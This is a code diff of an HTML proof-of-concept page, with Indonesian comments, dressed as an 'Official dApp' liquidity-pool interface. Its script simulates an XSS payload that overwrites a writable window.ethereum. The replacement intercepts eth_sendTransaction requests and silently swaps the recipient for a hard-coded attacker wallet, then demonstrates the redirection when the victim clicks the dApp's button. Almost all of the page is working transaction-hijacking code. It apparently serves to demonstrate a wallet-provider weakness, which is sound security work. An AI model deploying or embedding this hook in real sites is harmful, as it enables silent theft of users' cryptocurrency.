@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Decentralized Finance Protocol - Live dApp</title>
+    <title>Official dApp - Production Environment</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0b0e11; color: #eaecef; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #181a20; padding: 24px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.5); border: 1px solid #2b313a; }
@@ -19,24 +19,25 @@
 <body>
 
 <div class="card">
-    <h2>Liquidity Pool Staking</h2>
-    <p style="font-size: 13px; color: #848e9c; text-align: center;">Official Production Environment</p>
+    <h2>DEX Liquidity Pool</h2>
+    <p style="font-size: 13px; color: #848e9c; text-align: center;">Official dApp Interface</p>
     
     <div class="input-box">
-        <span class="label">Deposit Amount</span>
-        <span class="value">500 USDC</span>
+        <span class="label">Action</span>
+        <span class="value">Deposit & Stake</span>
     </div>
 
-    <!-- Tombol fungsi asli dari dApp -->
-    <button id="stakeBtn">Confirm Staking</button>
+    <!-- Tombol fungsi asli dari dApp yang sah -->
+    <button id="legitBtn">Proceed Transaction</button>
     
-    <div id="log">Status: dApp environment loaded.</div>
+    <div id="log">Status: Loading dApp environment...</div>
 </div>
 
 <!-- 
   =================================================================
-  SIMULASI VEKTOR XSS / KODE SKRIP PIHAK KETIGA YANG TERKOMPROMISI
-  Berjalan dalam konteks origin dApp yang sah (Production Context)
+  SIMULASI VEKTOR XSS NYATA PADA ORIGIN DAPP
+  Membuktikan bahwa ketika XSS terjadi di dApp, writable: true 
+  memungkinkan penyerang membajak transaksi dApp tersebut secara senyap.
   =================================================================
 -->
 <script>
@@ -45,64 +46,65 @@ function addLog(msg) {
     logEl.innerText += '\n' + msg;
 }
 
-(async () => {
-    // Memastikan objek ethereum tersedia dari browser dApp
+// Mensimulasikan eksekusi payload XSS yang berhasil masuk ke origin dApp
+(function simulateXSSInjection() {
+    addLog("[!] XSS Payload executed inside dApp origin.");
+    
     if (!window.ethereum) {
         addLog("[-] window.ethereum not found.");
         return;
     }
 
     const desc = Object.getOwnPropertyDescriptor(window, 'ethereum');
-    addLog(`[i] Provider Writable: ${desc.writable}`);
+    addLog(`[i] window.ethereum Writable: ${desc.writable}`);
 
     if (!desc.writable) {
-        addLog("[-] Provider is immutable. XSS hook prevented.");
+        addLog("[-] Provider is immutable. Attack mitigated.");
         return;
     }
 
     const attackerWallet = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
-    const realProvider = window.ethereum;
+    const originalProvider = window.ethereum;
 
-    // Vektor XSS/Skrip menyusup dengan menimpa window.ethereum secara global di origin ini
+    // Membajak objek global ethereum karena sifatnya yang writable
     window.ethereum = {
-        selectedAddress: realProvider.selectedAddress,
-        chainId: realProvider.chainId,
+        selectedAddress: originalProvider.selectedAddress,
+        chainId: originalProvider.chainId,
         request: async (args) => {
             if (args.method === "eth_sendTransaction" && args.params?.[0]) {
-                addLog(`[!] XSS Hook: Intercepted target -> ${args.params[0].to}`);
-                // Mengubah alamat tujuan transaksi secara senyap ke dompet penyerang
+                addLog(`[!] XSS Hook: Original target -> ${args.params[0].to}`);
+                // Mengubah alamat tujuan secara diam-diam ke dompet penyerang
                 args.params[0].to = attackerWallet;
-                addLog(`[!] XSS Hook: Silently redirected to attacker wallet!`);
+                addLog(`[!] XSS Hook: Target redirected to attacker!`);
             }
-            return realProvider.request(args);
+            return originalProvider.request(args);
         }
     };
 
-    addLog("[+] XSS Payload successfully hooked into window.ethereum.");
-
-    // Event listener tombol asli dApp yang dipicu oleh interaksi pengguna
-    document.getElementById('stakeBtn').addEventListener('click', async () => {
-        try {
-            const accounts = await realProvider.request({ method: "eth_requestAccounts" });
-            addLog(`[+] Active User: ${accounts[0].substring(0, 6)}...`);
-
-            addLog("[*] Executing original dApp contract interaction...");
-            // Pengguna mengira mereka mengirim dana ke smart contract staking yang sah,
-            // namun berhasil dibelokkan oleh hook XSS di atas.
-            await window.ethereum.request({
-                method: "eth_sendTransaction",
-                params: [{
-                    from: accounts[0],
-                    to: "0x3563456456456456456456456456456456456456", // Alamat asli smart contract dApp
-                    value: "0x0"
-                }]
-            });
-            addLog("[+] Flow completed.");
-        } catch (e) {
-            addLog(`[-] Error: ${e.message}`);
-        }
-    });
+    addLog("[+] XSS successfully hijacked window.ethereum globally.");
 })();
+
+// Event handler tombol asli dApp yang diklik oleh korban
+document.getElementById('legitBtn').addEventListener('click', async () => {
+    try {
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        addLog(`[+] User Account: ${accounts[0].substring(0, 6)}...`);
+
+        addLog("[*] Executing dApp smart contract call...");
+        // dApp memanggil transaksi ke kontrak aslinya, namun dibelokkan oleh XSS hook di atas
+        await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: accounts[0],
+                to: "0x7a250d5630b4cf539739df2c5dacb4c659f2488d", // Smart contract asli dApp
+                value: "0x0"
+            }]
+        });
+        addLog("[+] Transaction flow finished.");
+    } catch (e) {
+        addLog(`[-] Error: ${e.message}`);
+    }
+});
 </script>
 
 </body>
